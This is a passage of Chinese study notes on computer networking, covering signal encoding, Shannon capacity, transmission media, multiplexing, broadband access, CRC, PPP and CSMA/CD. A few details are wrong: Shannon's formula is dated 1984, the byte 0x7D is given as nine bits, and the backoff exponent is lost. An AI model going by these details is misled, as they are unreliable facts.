有关信道的几个基本概念</h3><ol><li>信道：一般用来表示向某一个方向传送信息的媒体。<ul><li>单向通信（单工通信）：只能有一个方向的通信而没有反方向的交互</li><li>双向交替通信（半双工通信）：通信的双方都可以发送信息，当不能双方同时发送与接收</li><li>双向同时通信（全双工通信）：通信的双方可以同时发送和接收信息</li></ul></li><li>基带信号：来自信源的信号。、</li><li>调制：为了解决许多信道不能传输这种低频分量或直流分量<ul><li>基带调制：仅对基带信号的波形进行变换，使它能够与信道特性相适应。变换后的信号仍然是基带信号。把这种过程称为编码 (coding)。</li><li>带通调制：使用载波 (carrier)进行调制，把基带信号的频率范围搬移到较高的频段，并转换为模拟信号，这样就能够更好地在模拟信道中传输（即仅在一段频率范围内能够通过信道）</li><li>带通信号 ：经过载波调制后的信号。</li></ul></li><li><p>常用编码方式：</p><ul><li>（1）不归零制：正电平代表 1，负电平代表 0。</li><li>（2）归零制：正脉冲代表 1，负脉冲代表 0。</li><li>（3）曼彻斯特编码：位周期中心的向上跳变代表 0，位周期中心的向下跳变代表 1。但也可反过来定义。</li><li>（4）差分曼彻斯特编码：在每一位的中心处始终都有跳变。位开始边界有跳变代表 0，而位开始边界没有跳变代表 1。<ul><li><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/nFwbk9.png" alt="nFwbk9.png"></li></ul></li><li>从信号波形中可以看出，曼彻斯特 (Manchester) 编码和差分曼彻斯特编码产生的信号频率比不归零制高。</li><li>从自同步能力来看，不归零制不能从信号波形本身中提取信号时钟频率（这叫作没有自同步能力），而曼彻斯特编码和差分曼彻斯特编码具有自同步能力。</li></ul></li><li><p>基本的带通调制方法</p><ul><li>（1）基带信号往往包含有较多的低频成分，甚至有直流成分，而许多信道并不能传输这种低频分量或直流分量。为了解决这一问题，就必须对基带信号进行调制 (modulation)。</li><li>（2）最基本的二元制调制方法有以下几种：<ul><li>调幅 (AM)：载波的振幅随基带数字信号而变化。</li><li>调频 (FM)：载波的频率随基带数字信号而变化。</li><li>调相 (PM) ：载波的初始相位随基带数字信号而变化</li></ul></li><li>（3）正交振幅调制 QAM</li></ul></li></ol><h2 id="2-3-信道的极限容量"><a href="#2-3-信道的极限容量" class="headerlink" title="2.3 信道的极限容量"></a>2.3 信道的极限容量</h2><ol><li>码元传输的速率越高，或信号传输的距离越远，或传输媒体质量越差，信道的输出端的波形的失真就越严重。</li><li><p>限制码元在信道上的传输速率的因素：</p><ul><li>（1）信道能通过的频率范围：<ul><li>码间串扰，奈式准则</li><li>在任何信道种，码元传输的速率是有上限的，传输速率超过此上限，就会出现严重的码间串扰的问题，使接收端对码元的判决（识别）成为不可能</li></ul></li><li>（2）信噪比<ul><li>信噪比 = 信号的平均功率 / 噪声的平均功率</li><li>常记为 S/N，并用分贝 (dB) 作为度量单位。即：<ul><li>信噪比 (dB) = 10 log₁₀(S/N)    (dB)</li><li>例如，当 S/N = 10 时，信噪比为 10 dB，而当 S/N = 1000 时，信噪比为 30 dB。</li></ul></li></ul></li></ul></li><li><p>1984 年，香农 (Shannon) 用信息论的理论推导出了带宽受限且有高斯白噪声干扰的信道的极限、无差错的信息传输速率（香农公式）。信道的极限信息传输速率 C 可表达为：</p><ul><li>C = W log₂(1 + S/N)    (bit/s)<ul><li>其中： W 为信道的带宽（以 Hz 为单位）;<ul><li>S 为信道内所传信号的平均功率；</li><li>N 为信道内部的高斯噪声功率。</li></ul></li></ul></li><li>信道的带宽或信道中的信噪比越大，则信息的极限传输速率就越高。</li><li>只要信息传输速率低于信道的极限信息传输速率，就一定可以找到某种办法来实现无差错的传输。</li><li>若信道带宽 W 或信噪比 S/N 没有上限（当然实际信道不可能是这样的），则信道的极限信息传输速率 C 也就没有上限。</li><li>实际信道上能够达到的信息传输速率要比香农的极限传输速率低不少。</li></ul></li><li>对于频带宽度已确定的信道，如果信噪比不能再提高了，并且码元传输速率也达到了上限值，那么还有办法提高信息的传输速率。这就是：<ul><li>用编码的方法让每一个码元携带更多比特的信息量。</li></ul></li></ol><h2 id="2-3-物理层下面的传输媒体"><a href="#2-3-物理层下面的传输媒体" class="headerlink" title="2.3 物理层下面的传输媒体"></a>2.3 物理层下面的传输媒体</h2><ul><li>传输媒体也称为传输介质或传输媒介，它就是数据传输系统中在发送器和接收器之间的物理通路。</li><li>传输媒体可分为两大类，即导引型传输媒体和非导引型传输媒体。</li><li>在导引型传输媒体中，电磁波被导引沿着固体媒体（铜线或光纤）传播。</li><li>非导引型传输媒体就是指自由空间。在非导引型传输媒体中，电磁波的传输常称为无线传输。</li></ul><h3 id="2-3-1-导引型传输媒体"><a href="#2-3-1-导引型传输媒体" class="headerlink" title="2.3.1 导引型传输媒体"></a>2.3.1 导引型传输媒体</h3><ol><li><p>双绞线：</p><ul><li>最常用的传输媒体。</li><li>模拟传输和数字传输都可以使用双绞线，其通信距离一般为几到十几公里。</li><li>屏蔽双绞线 STP (Shielded Twisted Pair) 带金属屏蔽层</li><li>无屏蔽双绞线 UTP (Unshielded Twisted Pair)<ul><li>室内传送数据的无屏蔽双绞线和屏蔽双绞线的标准 EIA/TIA-568。</li><li>布线标准更新为 EIA/TIA-568-A。</li><li>此标准规定了 5 个种类的 UTP 标准（从 1 类线到 5 类线）。</li><li>对传送数据来说，现在最常用的 UTP 是 5 类线（Category 5 或 CAT5）。</li></ul></li></ul></li><li><p>同轴电缆：</p><ul><li>同轴电缆具有很好的抗干扰特性，被广泛用于传输较高速率的数据。</li><li>同轴电缆的带宽取决于电缆的质量。</li><li>50 Ω 同轴电缆 —— LAN / 数字传输常用</li><li>75 Ω 同轴电缆 —— 有线电视 / 模拟传输常用</li></ul></li><li><p>光缆：</p><ul><li>光纤是光纤通信的传输媒体。</li><li>由于可见光的频率非常高，约为 10⁸ MHz 的量级，因此一个光纤通信系统的传输带宽远远大于目前其他各种传输媒体的带宽。</li><li>多模光纤</li><li>单模光纤</li><li>光线通信的优点：<ul><li>(1) 通信容量非常大。</li><li>(2) 传输损耗小，中继距离长。</li><li>(2) 抗雷电和电磁干扰性能好。</li><li>(3) 无串音干扰，保密性好。</li><li>(4) 体积小，重量轻。</li></ul></li></ul></li></ol><h3 id="2-3-2-非引导型传输媒体"><a href="#2-3-2-非引导型传输媒体" class="headerlink" title="2.3.2 非引导型传输媒体"></a>2.3.2 非引导型传输媒体</h3><ul><li>将自由空间称为“非导引型传输媒体”。</li><li>无线传输所使用的频段很广。紫外线和更高的波段目前还不能用于通信</li><li><strong>短波通信</strong>（即高频通信）主要是靠电离层的反射，但短波信道的通信质量较差，传输速率低。</li><li><strong>微波</strong>在空间主要是直线传播。</li><li>传统微波通信有两种方式：<ul><li>地面微波接力通信</li><li>卫星通信 ：通信距离远，传播时延大</li></ul></li></ul><h2 id="2-4-信道复用技术"><a href="#2-4-信道复用技术" class="headerlink" title="2.4 信道复用技术"></a>2.4 信道复用技术</h2><h3 id="2-4-1-频分复用，时分复用和统计时分复用"><a href="#2-4-1-频分复用，时分复用和统计时分复用" class="headerlink" title="2.4.1 频分复用，时分复用和统计时分复用"></a>2.4.1 频分复用，时分复用和统计时分复用</h3><ul><li><strong>复用</strong> (multiplexing) 是通信技术中的基本概念。它允许用户使用一个共享信道进行通信，降低成本，提高利用率。</li><li><strong>频分复用</strong> FDM：<ul><li>频分复用的所有用户在同样的时间占用不同的带宽资源（请注意，这里的“带宽”是频率带宽而不是数据的发送速率）。</li></ul></li><li><strong>时分复用</strong>：<ul><li>时分复用则是将时间划分为一段段等长的时分复用帧（TDM 帧）。每一个时分复用的用户在每一个 TDM 帧中占用固定序号的时隙。</li><li>每一个用户所占用的时隙是周期性地出现（其周期就是 TDM 帧的长度）。</li><li>TDM 信号也称为等时 (isochronous) 信号。</li><li>时分复用的所有用户是在不同的时间占用同样的频带宽度。</li><li>使用时分复用系统传送计算机数据时，由于计算机数据的突发性质，用户对分配到的子信道的利用率一般是不高的。</li></ul></li><li>在进行通信时，复用器和分用器成对的使用</li><li><strong>统计时分复用</strong> STDM：（异步时分复用）<ul><li>STDM 帧不是固定分配时隙，而是按需动态地分配时隙。因此统计时分复用可以提高线路的利用率。</li></ul></li><li><strong>波分复用</strong> WDM：波分复用就是光的频分复用。使用一根光纤来同时传输多个光载波信号。</li><li><strong>码分复用</strong> CDM：<ul><li>常用的名词是码分多址 CDMA (Code Division Multiple Access)。</li><li>各用户使用经过特殊挑选的不同码型，因此彼此不会造成干扰。</li><li>这种系统发送的信号有很强的抗干扰能力，其频谱类似于白噪声，不易被敌人发现。</li><li>每一个比特时间划分为 m 个短的间隔，称为码片 (chip)。</li><li>每个站被指派一个唯一的 m bit 码片序列。<ul><li>如发送比特 1，则发送自己的 m bit 码片序列。</li><li>如发送比特 0，则发送该码片序列的二进制反码。</li></ul></li><li>例如，S 站的 8 bit 码片序列是 00011011。<ul><li>发送比特 1 时，就发送序列 00011011，</li><li>发送比特 0 时，就发送序列 11100100。</li></ul></li><li>S 站的码片序列：(-1 -1 -1 +1 +1 -1 +1 +1)</li><li>假定 S 站要发送信息的数据率为 b bit/s。由于每一个比特要转换成 m 个比特的码片，因此 S 站实际上发送的数据率提高到 mb bit/s，同时 S 站所占用的频带宽度也提高到原来数值的 m 倍。</li><li>这种通信方式是扩频 (spread spectrum) 通信中的一种。</li><li>扩频通信通常有两大类：<ul><li>一种是直接序列扩频 DSSS (Direct Sequence Spread Spectrum)，如上面讲的使用码片序列就是这一类。</li><li>另一种是跳频扩频 FHSS (Frequency Hopping Spread Spectrum)。</li></ul></li><li>每个站分配的码片序列不仅要各不相同，并且还必须互相正交 (orthogonal)。</li><li>在实用的系统中是使用伪随机码序列。</li><li>令向量 S 表示站 S 的码片向量，令 T 表示其他任何站的码片向量。</li><li>两个不同站的码片序列正交，就是向量 S 和 T 的规格化内积 (inner product) 等于 0：</li><li>任何一个码片向量和该码片向量自己的规格化内积都是 1。</li><li>一个码片向量和该码片反码的向量的规格化内积值是 –1。</li></ul></li></ul><h2 id="2-5-数字传输系统"><a href="#2-5-数字传输系统" class="headerlink" title="2.5 数字传输系统"></a>2.5 数字传输系统</h2><ul><li>与模拟通信相比，数字通信无论是在传输质量上还是经济上都有明显的优势</li><li>目前，长途干线大都采用 PCM 是数字传输方式</li><li>脉码调制 PCM 体制，最初是为了在电话局之间的中继线上传送多路的电话</li><li>由于历史原因 PCM 有两个不兼容的国际标准：T1，E1</li><li>当需要有更高的数据率时，可以采用复用的方法</li><li>旧的数字传输系统存在许多缺点:<ul><li>(1) 速率标准不统一</li><li>(2) 不是同步传输</li></ul></li><li>同步光纤网 SONET 的各级时钟都来自一个非常精确的主时钟</li><li>同步数字系列 SDH，适用于微波和卫星传输</li></ul><h2 id="2-6-宽带接入技术"><a href="#2-6-宽带接入技术" class="headerlink" title="2.6 宽带接入技术"></a>2.6 宽带接入技术</h2><ul><li>用户要接入互联网，必须先连接到某个 ISP</li><li>美国联邦通信委员会 FCC 认为只要双向速率之和超过 200 kbit/s 就是宽带</li><li>从宽带接入的媒体来看，可以划分为两大类：<ul><li>有线宽带接入</li><li>无线宽带接入</li></ul></li></ul><h3 id="2-6-1-ADSL-技术"><a href="#2-6-1-ADSL-技术" class="headerlink" title="2.6.1 ADSL 技术"></a>2.6.1 ADSL 技术</h3><ul><li>非对称数字用户线 ADSL：用数字技术对现有的模拟电话用户线进行改造</li><li>ADSL 技术就是把 0~4 kHz 低端频谱给传统电话使用，而把原来没有被利用的高端频谱留给用户上网使用</li><li>DSL 就是数字用户线</li><li>ADSL 的传输距离取决于数据率和用户线的途径</li><li>ADSL 所得到的最高数据传输速率与实际的用户线上的信噪比密切相关</li><li>ADSL 的特点：<ul><li>上行（用户到 ISP）和下行（ISP 到用户）带宽不对称</li><li>ADSL 在用户线的两端各安装一个 ADSL 调制解调器</li><li>我国目前采用的方案是离散多音调 DMT 调制技术<ul><li>多音调：指多载波 / 多子信道</li><li>DMT 技术：<ul><li>采用频分复用</li><li>相当于在一对用户线上使用许多小的调制解调器并行的传送数据。</li></ul></li></ul></li></ul></li><li>ADSL 的数据率：<ul><li>ADSL 采用自适应调制技术使用户线能够传送尽可能高的数据率</li><li>ADSL 不能保证固定的数据率</li></ul></li><li>第二代 ADSL：<ul><li>通过提高调制效率得到更高的数据率</li><li>采用无缝速率自适应技术</li></ul></li></ul><h3 id="2-6-2-光线同轴混合网"><a href="#2-6-2-光线同轴混合网" class="headerlink" title="2.6.2 光线同轴混合网"></a>2.6.2 光线同轴混合网</h3><ul><li>HFC 网是在目前覆盖面很广的有线电视网 CATV 基础上开发的一种居民宽带接入网</li><li>HFC 网对 CATV 网进行了改造</li><li>HFC 网将原 CATV 网中的同轴电缆主干部分该换为光纤，并使用模拟光纤技术</li><li>在模拟光纤中采用光的振幅 AM</li><li>模拟光纤从头端连接到光纤结点，即光分配结点 ODN</li><li>HFC 网采用结点体系</li><li>HFC 网具有双向传输功能，扩展了传输频带</li><li>用户接口盒 UIB 要提供三种连接：<ul><li>使用同轴电缆连接到机顶盒，然后再连接到用户的电视机</li><li>使用双绞线连接到用户的电话机</li><li>使用电缆调制解调器来连接到用户的计算机<ul><li>电缆调制解调器是为 HFC 网而使用的调制解调器</li></ul></li></ul></li></ul><h3 id="2-6-3-FTTx-技术"><a href="#2-6-3-FTTx-技术" class="headerlink" title="2.6.3 FTTx 技术"></a>2.6.3 FTTx 技术</h3><ul><li>FTTx 是一种实现宽带居民接入网的方案，代表多种宽带光纤接入方式</li></ul><h1 id="第三章-数据链路层"><a href="#第三章-数据链路层" class="headerlink" title="第三章 数据链路层"></a>第三章 数据链路层</h1><ul><li>数据链路层使用的信道主要有以下两种类型：<ul><li>点对点信道 ===》 一对一</li><li>广播信道 ===》 一对多，采用专用的共享信道协议</li></ul></li><li>路由器只包含网络层，链路层，物理层</li><li>不同链路层可能采用不同的数据链路层协议</li></ul><h2 id="3-1-使用点对点信道的数据链路层"><a href="#3-1-使用点对点信道的数据链路层" class="headerlink" title="3.1 使用点对点信道的数据链路层"></a>3.1 使用点对点信道的数据链路层</h2><h3 id="3-1-1-数据链路和帧"><a href="#3-1-1-数据链路和帧" class="headerlink" title="3.1.1 数据链路和帧"></a>3.1.1 数据链路和帧</h3><ul><li>链路（物理链路）：一条无源的点到点的物理线路段，中间没有任何其他的交换结点</li><li>一条链路只是一条通路的一个组成部分</li><li>数据链路（逻辑链路）：除了物理线路外，还必须有通信协议软件来控制这些数据的传输。若是把实现这些协议的硬件和软件加到链路上，就构成了数据链路。<ul><li>最常用的方法是使用网络适配器（即网卡）来实现这些协议的硬件和软件。</li><li>一般适配器都包括了数据链路层和物理层这两方面的功能</li></ul></li><li>早期的数据通信协议就做通信规程，在数据链路层中，规程和协议是同义语。</li><li>帧 - 数据链路层的协议数据单元</li><li>IP 数据报：网络层的协议数据单元</li><li>数据链路层不必考虑物理层如何实现比特传输的细节，只考虑数据的封装等</li></ul><h3 id="3-1-2-三个基本问题"><a href="#3-1-2-三个基本问题" class="headerlink" title="3.1.2 三个基本问题"></a>3.1.2 三个基本问题</h3><ol><li><p><strong>封装成帧</strong>：</p><ul><li>封装成帧就是在一段数据的前后分别添加首部和尾部；</li><li>首部和尾部的一个重要作用就是帧定界</li><li>每一种链路层协议都规定了所能传送的帧的数据部分长度上限 — 最大传送单元 MTU</li><li>当数据是由可打印的 ASCII 码组成的文本文件时，帧定界可以使用特殊的帧定界符。</li><li>控制字符 SOH (Start Of Header) 放在一帧的最前面，表示帧的首部开始。另一个控制字符 EOT (End Of Transmission) 表示帧的结束。</li></ul></li><li><p><strong>透明传输</strong>：</p><ul><li>如果数据中的某个字节的二进制代码恰好和 SOH 或 EOT 一样，数据链路层就会错误地“找到帧的边界”。</li><li>解决方法：字节填充 (byte stuffing) 或字符填充 (character stuffing)。</li><li>发送端的数据链路层在数据中出现控制字符“SOH”或“EOT”的前面插入一个转义字符“ESC” (其十六进制编码是 1B)。</li><li>接收端的数据链路层在将数据送往网络层之前删除插入的转义字符。</li><li>如果转义字符也出现在数据当中，那么应在转义字符前面插入一个转义字符 ESC。当接收端收到连续的两个转义字符时，就删除其中前面的一个。</li></ul></li><li><p><strong>差错检验</strong>：</p><ul><li>在传输过程中可能会产生比特差错：1 可能会变成 0 而 0 也可能变成 1。</li><li>在一段时间内，传输错误的比特占所传输比特总数的比率称为误码率 BER (Bit Error Rate)。</li><li>为了保证数据传输的可靠性，在计算机网络传输数据时，必须采用各种差错检测措施。</li><li>循环冗余检验：<ul><li>在发送端，先把数据划分为组。假定每组 k 个比特。</li><li>假设待传送的一组数据 M = 101001（现在 k = 6）。我们在 M 的后面再添加供差错检测用的 n 位冗余码一起发送。</li><li>冗余码的计算：<ul><li>用二进制的模 2 运算进行 2ⁿ 乘 M 的运算，这相当于在 M 后面添加 n 个 0。</li><li>得到的 (k + n) 位的数除以事先选定好的长度为 (n + 1) 位的除数 P，得出商是 Q 而余数是 R，余数 R 比除数 P 少 1 位，即 R 是 n 位。</li><li>将余数 R 作为冗余码拼接在数据 M 后面发送出去。发送的数据是：2ⁿ*M + R 即：101001001，共 (k + n) 位。</li></ul></li><li>在数据后面添加上的冗余码称为帧检验序列 FCS</li><li>CRC 是一种常用的检错方法，FCS 是添加在数据后面的冗余码</li><li>FCS 可以用 CRC 这种方法得出，但是 CRC 并非用来获得 FCS 的唯一方法</li><li>检验结果：<ul><li>若得出的余数 R = 0，则判定这个帧没有差错，就接受 (accept)。</li><li>若余数 R ≠ 0，则判定这个帧有差错，就丢弃。</li></ul></li><li>但这种检测方法并不能确定究竟是哪一个或哪几个比特出现了差错。</li><li>只要经过严格的挑选，并使用位数足够多的除数 P，那么出现检测不到的差错的概率就很小很小。</li></ul></li><li>注意：<ul><li>仅用循环冗余检验 CRC 差错检测技术只能做到无差错接受。</li><li>“无差错接受”是指：“凡是接受的帧（即不包括丢弃的帧），我们都能以非常接近于 1 的概率认为这些帧在传输过程中没有产生差错”。</li><li>也就是说：“凡是接收端数据链路层接受的帧都没有传输差错”（有差错的帧就丢弃而不接受）。</li><li>要做到“可靠传输”（即发送什么就收到什么）就必须再加上确认和重传机制。</li></ul></li><li>应当明确，“无比特差错”与“无传输差错”是不同的概念。</li><li>在数据链路层使用 CRC 检验，能够实现无比特差错的传输，但这还不是可靠传输。</li><li>本章介绍的数据链路层协议都不是可靠传输的协议。</li></ul></li></ol><h2 id="3-2-点对点协议-PPP"><a href="#3-2-点对点协议-PPP" class="headerlink" title="3.2 点对点协议 PPP"></a>3.2 点对点协议 PPP</h2><h3 id="3-2-1-PPP-协议的特点"><a href="#3-2-1-PPP-协议的特点" class="headerlink" title="3.2.1 PPP 协议的特点"></a>3.2.1 PPP 协议的特点</h3><ol><li><p>PPP 协议应满足的需求：</p><ul><li>（1）简单：首要需求，提高互操作性</li><li>（2）封装成帧：规定特殊的字符作为帧定界符</li><li>（3）透明性：必须保证数据传输的透明性</li><li>（4）多种网络层协议：在同一条物理链路上同时支持多种网络层协议</li><li>（5）多种类型链路：</li><li>（6）差错检验：检测并丢弃有差错的帧</li><li>（7）检测连接状态：</li><li>（8）最大传送单元：MTU 是数据链路层的帧可以载荷的数据部分的最大长度，而不是帧的总长度</li><li>（9）网络层地址协商：</li><li>（10）数据压缩协商：</li></ul></li><li><p>PPP 协议不需要的功能：</p><ul><li>（1）纠错：因为可靠传输由运输层的 TCP 协议负责</li><li>（2）流量控制</li><li>（3）序号</li><li>（4）多点线路：因为 PPP 只支持点对点的链路通信</li><li>（5）半双工或单双工：因为 PPP 只支持全双工链路</li></ul></li><li><p>PPP 协议的组成：</p><ul><li>（1）一个将 IP 数据报封装到串行链路的方法</li><li>（2）链路控制协议 LCP：用来建立，配置，和测试数据链路的连接</li><li>（3）网络控制协议 NCP：</li></ul></li></ol><h3 id="3-2-2-PPP-协议的帧格式"><a href="#3-2-2-PPP-协议的帧格式" class="headerlink" title="3.2.2 PPP 协议的帧格式"></a>3.2.2 PPP 协议的帧格式</h3><ol><li><p>各字段的意义：</p><ul><li>ppp 帧的首部和尾部分别为 4 个字段和 2 个字段</li><li>标志字段 F 规定为 0x7E（即 01111110），标志一个帧的开始和结束</li><li>地址字段 A 规定为 0xFF（即 11111111）</li><li>控制字段 C 规定为 0x03（即 00000011）</li><li>协议字段，两个字节</li></ul></li><li><p>字节填充</p><ul><li>PPP 是面向字节的，所有的 PPP 帧的长度都是整数字节</li><li>透明传输问题：<ul><li>PPP 用在同步传输链路时，协议规定采用硬件来完成比特填充</li><li>当 PPP 用在异步传输时，就使用一种特殊的字符填充法</li><li>把转义字符定义为 0x7D（即 011111101）</li><li>PPP 协议用在 SONET/SDH 链路时，使用同步传输，这时 PPP 协议采用零比特填充方法实现透明传输</li></ul></li></ul></li><li><p>零比特填充</p><ul><li>只要发现有 5 个连续的 1，则立即填入一个 0，因此经过这种填充后的数据不会出现六个连续的 1.（因为几个特殊字段内有 111111）</li></ul></li></ol><h3 id="3-2-3-PPP-协议的工作状态"><a href="#3-2-3-PPP-协议的工作状态" class="headerlink" title="3.2.3 PPP 协议的工作状态"></a>3.2.3 PPP 协议的工作状态</h3><ul><li>PPP 协议已不是纯粹的数据链路层的协议，它还包含了物理层和网络层的内容。</li><li>链路静止状态</li><li>链路建立状态</li><li>链路打开状态</li><li>链路终止状态</li></ul><h2 id="3-3-使用广播信道的数据链路层"><a href="#3-3-使用广播信道的数据链路层" class="headerlink" title="3.3 使用广播信道的数据链路层"></a>3.3 使用广播信道的数据链路层</h2><h3 id="3-3-1-局域网的数据链路层"><a href="#3-3-1-局域网的数据链路层" class="headerlink" title="3.3.1 局域网的数据链路层"></a>3.3.1 局域网的数据链路层</h3><ul><li>局域网最主要的特点是：<ul><li>网络为一个单位所拥有；</li><li>地理范围和站点数目均有限。</li></ul></li><li>局域网具有如下主要优点：<ul><li>具有广播功能，从一个站点可很方便地访问全网。局域网上的主机可共享连接在局域网上的各种硬件和软件资源。</li><li>便于系统的扩展和逐渐地演变，各设备的位置可灵活调整和改变。</li><li>提高了系统的可靠性、可用性和残存性。</li></ul></li><li>局域网按拓扑结构分类：<ul><li>星型网，集线器</li><li>总线网，匹配电阻</li><li>环形网，干线耦合器</li></ul></li><li>局域网中的主要传输媒体： 双绞线</li><li>当数据率很高时，往往需要使用光纤作为传输媒体</li><li><p>媒体共享技术：</p><ul><li>静态划分信道：频分复用，时分复用，波分复用，码分复用</li><li>动态媒体接入控制（多点接入）：<ul><li>随机接入：所有用户可随机地发送信息。但是同一时刻发送信息，会产生碰撞（冲突），故需要解决碰撞的网络协议。</li><li>受控接入：用户不能随机发送信息，必须服从一定控制：如多点线路探询，轮询。</li></ul></li></ul></li><li><p>以太网的两个标准：</p><ul><li>DIX Ethernet V2 是世界上第一个局域网产品（以太网）的规约。</li><li>IEEE 802.3 是第一个 IEEE 的以太网标准。</li><li>IEEE 802 委员会就将局域网的数据链路层拆成两个子层：<ul><li>逻辑链路控制 LLC (Logical Link Control) 子层；</li><li>媒体接入控制 MAC (Medium Access Control) 子层。</li></ul></li><li>与接入到传输媒体有关的内容都放在 MAC 子层，而 LLC 子层则与传输媒体无关。</li><li>不管采用何种协议的局域网，对 LLC 子层来说都是透明的</li></ul></li><li><p>适配器的作用：</p><ul><li>网络接口板又称为通信适配器 (adapter) 或网络接口卡 NIC (Network Interface Card)，或“网卡”。</li><li>适配器的重要功能：<ul><li>进行串行 / 并行转换。</li><li>对数据进行缓存。</li><li>在计算机的操作系统安装设备驱动程序。</li><li>实现以太网协议。</li></ul></li><li>适配器在接受和发送各种帧时，不适用计算机的 CPU。当收到有差错的帧时，直接丢弃而不必通知计算机。当收到正确的帧时，使用中断来通知计算机，并交付协议栈中的网络层 。当计算机要发送 IP 数据报时，，就由协议栈把 IP 数据报向下交给适配器，组装成帧后发送到局域网</li></ul></li></ul><h3 id="3-3-2-CSMA-CD-协议"><a href="#3-3-2-CSMA-CD-协议" class="headerlink" title="3.3.2 CSMA/CD 协议"></a>3.3.2 CSMA/CD 协议</h3><ul><li>总线的特点：当一台计算机发送数据时，总线上的所有的计算机都能检测到这个数据</li><li>为了在总线上实现一对一的通信，可以使适配器拥有一个独一无二的地址</li><li>为了通信简便，以太网采用：<ul><li>采用较为灵活的无连接的工作方式<ul><li>不必先建立连接就可以直接发送数据。</li><li>对发送的数据帧不进行编号，也不要求对方发回确认。</li><li>这样做的理由是局域网信道的质量很好，因信道质量产生差错的概率是很小的。</li><li>以太网提供的服务是不可靠的交付，即尽最大努力的交付。</li><li>当目的站收到有差错的数据帧时就丢弃此帧，其他什么也不做。差错的纠正由高层来决定。</li></ul></li><li>以太网发送的数据都使用曼切斯特编码：<ul><li>缺点：占用的频带宽度比原始的基带信号增加了一倍</li></ul></li><li>CSMA/CD 协议：<ul><li>CSMA/CD 含义：载波监听多点接入 / 碰撞检测 (Carrier Sense Multiple Access with Collision Detection) 。</li><li>“多点接入”表示许多计算机以多点接入的方式连接在一根总线上。</li><li>“载波监听”是指每一个站在发送数据之前先要检测一下总线上是否有其他计算机在发送数据，如果有，则暂时不要发送数据，以免发生碰撞。但是，由于电磁波在总线上的传播速率是有限的，当某个站监听到总线是空闲时，也可能总线并非真正是空闲的所以需要在发送期间进行碰撞检测，以检测冲突。</li><li>“碰撞检测”是指边发送边监听</li><li>总线上并没有什么“载波”。“载波监听”就是用电子技术检测总线上有没有其他计算机发送的数据信号</li><li>检测到碰撞后 ： 每一个正在发送数据的站，一旦发现总线上出现了碰撞，就要立即停止发送，免得继续浪费网络资源，然后等待一段随机时间后再次发送。</li><li>由于电磁波在总线上的传播速率是有限的，当某个站监听到总线是空闲时，也可能总线并非真正是空闲的所以需要在发送期间进行碰撞检测，以检测冲突。</li></ul></li></ul></li><li>在使用 CSMA/CD 协议时，一个站不可能同时进行发送和接收（但必须边发送边监听信道）</li><li>因此 CSMA/CD 协议不可能进行全双工通信只能进行双向交替通信（半双工通信）</li><li>每个站在发送数据之后的一小段时间内，存在着遭遇碰撞的可能性。</li><li>这种发送的不确定性使整个以太网的平均通信量远小于以太网的最高数据率。</li><li>最先发送数据帧的站，在发送数据帧后至多经过时间 2τ （两倍的端到端往返时延） 就可知道发送的数据帧是否遭受了碰撞。</li><li>以太网的端到端往返时延 2τ 称为争用期，或碰撞窗口。</li><li>经过争用期这段时间还没有检测到碰撞，才能肯定这次发送不会发生碰撞。</li><li>二进制指数型退避算法：<ul><li>发生碰撞的站在停止发送数据后，要推迟（退避）一个随机时间才能再发送数据。</li><li>基本退避时间取为争用期 2τ。</li><li>从整数集合 [0, 1, … , (2k-1)] 中随机地取出一个数，记为 r。重传所需的时延就是 r 倍的基本退避时间。</li><li>参数 k 按下面的公式计算：<ul><li>k = Min[重传次数, 10]</li></ul></li><li>当 k ≤ 10 时，参数 k 等于重传次数。</li><li>当重传达 16 次仍不能成功时即丢弃该帧，并向高层报告。</li><li>以太网在发送数据时，若前 64 字节没有发生冲突，则后续的数据就不会发生冲突。最短有效帧长为 64 字节</li></ul></li><li>强化碰撞：当发送数据的站一旦发现发生了碰撞时：<ul><li>立即停止发送数据；</li><li>再继续发送若干比特的人为干扰信号以便让所有用户都知道现在已经发生了碰撞。</li></ul></li><li>CSMA/CD 协议的要点：<ul><li>（1）准备发送</li><li>（2）检测信道</li><li>（3）检查碰撞</li></ul></li></ul><h3 id="3-3-3-使用集线器的星形拓扑"><a href="#3-3-3-使用集线器的星形拓扑" class="headerlink" title="3.3.3 使用集线器的星形拓扑"></a>3.3.3 使用集线器的星形拓扑</h3><ul><li>特点：<ul><li>（1）使用集线器的以太网在逻辑上仍是一个总线网，各站共享逻辑上的总线，各适配器使用的还是 CSMA/CD 协议，并且同一时刻只允许一个站发送数据</li><li>（2）一个集线器很像一个多接口的转发器</li><li>（3）集线器工作在物理层，它的每一个接口仅仅简单地转发比特，不进行碰撞检测</li><li>（4）采用专门的芯片</li></ul></li></ul><h3 id="3-3-4-以太网的信道利用率"><a href="#3-3-4-以太网的信道利用率" class="headerlink" title="3.3.4 以太网的信道利用率"></a>3.3.4 以太网的信道利用率</h3><ul><li>要提高以太网的信道利用率，就必须减少 τ 与 T0 之比，在以太网中定义了参数 a，它是以太网单程端到端时延 τ 与帧的发送时间 T0：<ul><li>a = τ / T0；</li></ul></li><li>α →0，表示一发生碰撞就立即可以检测出来，并立即停止发送，因而信道利用率很高。</li><li>α 越大，表明争用期所占的比例增大，每发生一次碰撞就浪费许多信道资源，使得信道利用率明显降低。</li><li>为提高利用率，以太网的参数 a 的值应当尽可能小些。</li><li>对以太网参数 α 的要求是：<ul><li>（1）当数据率一定时，以太网的连线的长度受到限制，否则 τ 的数值会太大。</li><li>（2）以太网的帧长不能太短，否则 T0 的值会太小，使 α 值太大。</li><li>（3）只有当参数 a 远小于 1 才能得到尽可能高的极限信道利用率。</li></ul></li><li>理想情况下的极限信道利用率 Smax 为：<ul><li>Smax = T0 / (T0 + τ ) = 1 / (1 + a )</li></ul></li></ul><h3 id="3-3-5-以太网的-MAC-的层"><a href="#3-3-5-以太网的-MAC-的层" class="headerlink" title="3.3.5 以太网的 MAC 的层"></a>3.3.5 以太网的 MAC 的层</h3><ol><li><p>MAC 层的硬件地址：</p><ul><li>在局域网中，硬件地址又称为物理地址，或 MAC 地址。</li><li>IEEE 802 标准为局域网规定了一种 48 位的全球地址，是指局域网上的每一台计算机中固化在适配器的 ROM 中的地址</li><li>IEEE 的 RA 是局域网全球地址的法定管理结构，它负责分配地址字段的 6 个字节的前三个字节。生产局域网适配器的厂家需要向 IEEE 购买由这三个字节构成的组织唯一标识符 OUI</li><li>厂家自行指派后三个字节，称为扩展标识符，用这种方法得到的 48 位地址称为 EUI-48</li><li>IEEE 规定地址字段的第一字节的最低位为 I/G 位：I/G 位为 0 